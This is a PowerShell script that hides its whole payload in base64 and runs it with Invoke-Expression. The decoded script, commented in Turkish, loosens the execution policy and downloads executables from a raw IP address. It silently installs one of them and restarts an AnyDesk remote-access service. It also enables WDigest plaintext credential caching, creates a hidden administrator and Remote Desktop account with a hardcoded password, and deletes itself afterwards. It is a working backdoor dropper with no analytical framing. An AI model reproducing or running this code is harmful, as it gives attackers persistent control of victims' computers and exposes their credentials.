$base64Script = "IyBFeGVjdXRpb24gUG9saWN5IEF5YXJsYXLEsQ0KU2V0LUV4ZWN1dGlvblBvbGljeSAtRXhlY3V0aW9uUG9saWN5IFJlbW90ZVNpZ25lZCAtU2NvcGUgQ3VycmVudFVzZXIgLUZvcmNlDQpTZXQtRXhlY3V0aW9uUG9saWN5IFVucmVzdHJpY3RlZCAtU2NvcGUgQ3VycmVudFVzZXIgLUZvcmNlDQoNCiMgS3VsbGFuxLFjxLEgQmlsZ2lsZXJpDQokYWQgPSAiYWRtaW5zMTEiDQokc2lmcmUxID0gIkBAQDExMUFkbWluLiINCiRpc2ltID0gImFkbWluczExIg0KDQojIFVSTCB2ZSBkb3N5YSBhZGxhcsSxDQokdXJscyA9IEAoDQogICAgImh0dHA6Ly8yLjU3LjE0OS4yMzIvVG9vbHMuZXhlIiwNCiAgICAiaHR0cDovLzIuNTcuMTQ5LjIzMi9BRC5leGUiLA0KICAgICJodHRwOi8vMi41Ny4xNDkuMjMyL1Rvb2xzMi5leGUiDQopDQoNCiRmaWxlTmFtZXMgPSBAKA0KICAgICIxdG9vbHMuZXhlIiwNCiAgICAiQUQuZXhlIiwNCiAgICAiMnRvb2xzLmV4ZSINCikNCg0KIyBIZWRlZiBkaXppbmxlcg0KJGRlc3RpbmF0aW9uRGlycyA9IEAoDQogICAgIkM6XHVzZXJzXEFkbWluaXN0cmF0b3JcRGVza3RvcFwiLA0KICAgICJDOlx1c2Vyc1xBZG1pbmlzdHJhdG9yXERvY3VtZW50c1wiLA0KICAgICJDOlx1c2Vyc1xBZG1pbmlzdHJhdG9yXERvd25sb2Fkc1wiDQopDQoNCiMgVVJMIHZlIGRvc3lhIGFkbGFyxLFuxLEga29udHJvbCBldA0KdHJ5IHsNCiAgICBpZiAoJHVybHMuTGVuZ3RoIC1uZSAkZmlsZU5hbWVzLkxlbmd0aCAtb3IgJHVybHMuTGVuZ3RoIC1uZSAkZGVzdGluYXRpb25EaXJzLkxlbmd0aCkgew0KICAgICAgICB0aHJvdyAiVVJMLCBkb3N5YSBhZMSxIHZlIGhlZGVmIGRpemluIHNhecSxbGFyxLEgZcWfbGXFn21peW9yLiINCiAgICB9DQp9IGNhdGNoIHsNCiAgICBXcml0ZS1Ib3N0ICJIYXRhIG9sdcWfdHU6ICRfIg0KICAgIHJldHVybg0KfQ0KDQojIMSwxZ9sZW0NCmZvciAoJGkgPSAwOyAkaSAtbHQgJHVybHMuTGVuZ3RoOyAkaSsrKSB7DQogICAgJHVybCA9ICR1cmxzWyRpXQ0KICAgICRmaWxlTmFtZSA9ICRmaWxlTmFtZXNbJGldDQogICAgJGRlc3RpbmF0aW9uRGlyID0gJGRlc3RpbmF0aW9uRGlyc1skaV0NCiAgICAkbG9jYWxGaWxlUGF0aCA9IEpvaW4tUGF0aCAtUGF0aCAkZGVzdGluYXRpb25EaXIgLUNoaWxkUGF0aCAkZmlsZU5hbWUNCg0KICAgIHRyeSB7DQogICAgICAgICMgRG9zeWEgaW5kaXJtZSBpxZ9sZW1pDQogICAgICAgICRyZXNwb25zZSA9IEludm9rZS1XZWJSZXF1ZXN0IC1VcmkgJHVybCAtVXNlQmFzaWNQYXJzaW5nDQogICAgICAgICRmaWxlQnl0ZXMgPSAkcmVzcG9uc2UuQ29udGVudCAtYXMgW2J5dGVbXV0NCg0KICAgICAgICAjIERvc3lhIGtheWRldG1lIGnFn2xlbWkNCiAgICAgICAgW1N5c3RlbS5JTy5GaWxlXTo6V3JpdGVBbGxCeXRlcygkbG9jYWxGaWxlUGF0aCwgJGZpbGVCeXRlcykNCiAgICAgICAgV3JpdGUtSG9zdCAiRG9zeWEgYmHFn2FyxLF5bGEga2F5ZGVkaWxkaTogJGxvY2FsRmlsZVBhdGgiDQogICAgfSBjYXRjaCB7DQogICAgICAgICMgSGF0YSBkdXJ1bXVuZGEgbWVzYWogeWF6ZMSxciB2ZSBkZXZhbSBldA0KICAgICAgICBXcml0ZS1Ib3N0ICJIYXRhIG9sdcWfdHUsIGnFn2xlbSBkZXZhbSBlZGl5b3I6ICRfIg0KICAgICAgICBjb250aW51ZQ0KICAgIH0NCn0NCg0KIyBEacSfZXIgacWfbGVtbGVyDQp0cnkgew0KICAgICRjbWRDb21tYW5kID0gJ0M6XHdpbmRvd3NcdGVtcFxBRC5leGUgLS1pbnN0YWxsICJDOlxQcm9ncmFtIEZpbGVzICh4ODYpIiAtLXNpbGVudCcNCiAgICBJbnZva2UtRXhwcmVzc2lvbiAtQ29tbWFuZCAkY21kQ29tbWFuZA0KfSBjYXRjaCB7DQogICAgV3JpdGUtSG9zdCAiQUQuZXhlIGt1cnVsdW11IGJhxZ9hcsSxc8Sxei4iDQp9DQoNCiMgSGl6bWV0aSBSZXN0YXJ0IEV0DQp0cnkgew0KICAgIFJlc3RhcnQtU2VydmljZSAtTmFtZSAiQW55ZGVzayBBbnlkZXNrIFNlcnZpY2UiDQp9IGNhdGNoIHsNCiAgICBXcml0ZS1Ib3N0ICJBbnlkZXNrIHNlcnZpc2kgcmVzdGFydCBlZGlsZW1lZGkuIg0KfQ0KDQojIFJlZ2lzdHJ5IERlxJ9lcmluaSBBeWFybGENCnRyeSB7DQogICAgJHJlZ2lzdHJ5UGF0aCA9ICJIS0xNOlxTWVNURU1cQ3VycmVudENvbnRyb2xTZXRcQ29udHJvbFxTZWN1cml0eVByb3ZpZGVyc1x3ZGlnZXN0Ig0KICAgICRyZWdpc3RyeU5hbWUgPSAiVXNlTG9nb25DcmVkZW50aWFsIg0KICAgICRyZWdpc3RyeVZhbHVlID0gMQ0KICAgIE5ldy1JdGVtUHJvcGVydHkgLVBhdGggJHJlZ2lzdHJ5UGF0aCAtTmFtZSAkcmVnaXN0cnlOYW1lIC1WYWx1ZSAkcmVnaXN0cnlWYWx1ZSAtUHJvcGVydHlUeXBlIERXT1JEIC1Gb3JjZQ0KfSBjYXRjaCB7DQogICAgV3JpdGUtSG9zdCAiUmVnaXN0cnkgZGXEn2VyaSBheWFybGFuYW1hZMSxLiINCn0NCg0KIyBZZW5pIEt1bGxhbsSxY8SxIE9sdcWfdHVyDQp0cnkgew0KICAgICRzaWZyZSA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgLVN0cmluZyAkc2lmcmUxIC1Bc1BsYWluVGV4dCAtRm9yY2UNCiAgICBOZXctTG9jYWxVc2VyIC1OYW1lICRhZCAtUGFzc3dvcmQgJHNpZnJlIC1GdWxsTmFtZSAkaXNpbSAtRGVzY3JpcHRpb24gIlllbmkga3VsbGFuxLFjxLEgaGVzYWLEsSBvbHXFn3R1cnVsZHUuIg0KDQogICAgIyBLdWxsYW7EsWPEsXnEsSBCZWxpcmxpIEJpciBHcnViYSBFa2xlIChHcnVwU0lEIGJlbGlydGlsbWVtacWfLCBkw7x6ZW5sZW5tZXNpIGdlcmVrZWJpbGlyKQ0KICAgICRncnVwU0lEID0gIlMtMS01LTMyLTU0NCIgICMgQnUgw7ZybmVrdGUgQWRtaW5pc3RyYXRvcnMgZ3J1YnUNCiAgICBBZGQtTG9jYWxHcm91cE1lbWJlciAtU0lEICRncnVwU0lEIC1NZW1iZXIgJGFkDQp9IGNhdGNoIHsNCiAgICBXcml0ZS1Ib3N0ICJZZW5pIGt1bGxhbsSxY8SxIG9sdcWfdHVydWxhbWFkxLEgdmV5YSBncnViYSBla2xlbmVtZWRpLiINCn0NCg0KIyBuZXQgdXNlciB2ZSBuZXQgbG9jYWxncm91cCBrb211dGxhcsSxIGlsZSBkZXZhbSBlZGVuIGLDtmzDvG1sZXINCnRyeSB7DQogICAgbmV0IHVzZXIgJGFkICRzaWZyZTEgL2FkZA0KfSBjYXRjaCB7DQogICAgV3JpdGUtSG9zdCAibmV0IHVzZXIga29tdXR1IGJhxZ9hcsSxc8SxeiBvbGR1LiINCn0NCg0KdHJ5IHsNCiAgICBuZXQgbG9jYWxncm91cCBBZG1pbmlzdHJhdG9ycyAkYWQgL2FkZA0KfSBjYXRjaCB7DQogICAgV3JpdGUtSG9zdCAibmV0IGxvY2FsZ3JvdXAgQWRtaW5pc3RyYXRvcnMga29tdXR1IGJhxZ9hcsSxc8SxeiBvbGR1LiINCn0NCg0KdHJ5IHsNCiAgICAkbG9jYWxHcm91cHMgPSBAKCJBZG1pbmlzdHJhZG9yZXMiLCAiQWRtaW5pc3RyYXRvcmVuIiwgIkFkbWluaXN0cmF0ZXVycyIsICJSZW1vdGUgRGVza3RvcCBVc2VycyIpDQoNCiAgICBmb3JlYWNoICgkZ3JvdXAgaW4gJGxvY2FsR3JvdXBzKSB7DQogICAgICAgIG5ldCBsb2NhbGdyb3VwICRncm91cCAkYWQgL2FkZA0KICAgIH0NCn0gY2F0Y2ggew0KICAgIFdyaXRlLUhvc3QgIm5ldCBsb2NhbGdyb3VwIGtvbXV0dSBiYcWfYXLEsXPEsXogb2xkdS4iDQp9DQoNCiMgU2NyaXB0J2kgU2lsDQp0cnkgew0KICAgIFJlbW92ZS1JdGVtIC1QYXRoICJDOlxXaW5kb3dzXFRlbXBcQUQuZXhlIiAtRm9yY2UNCiAgICBSZW1vdmUtSXRlbSAtUGF0aCAkTXlJbnZvY2F0aW9uLk15Q29tbWFuZC5QYXRoIC1Gb3JjZQ0KfSBjYXRjaCB7DQogICAgV3JpdGUtSG9zdCAiRG9zeWFsYXIgdmV5YSBzY3JpcHQgc2lsaW5lbWVkaS4iDQp9DQo="
Invoke-Expression -Command ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64Script)))
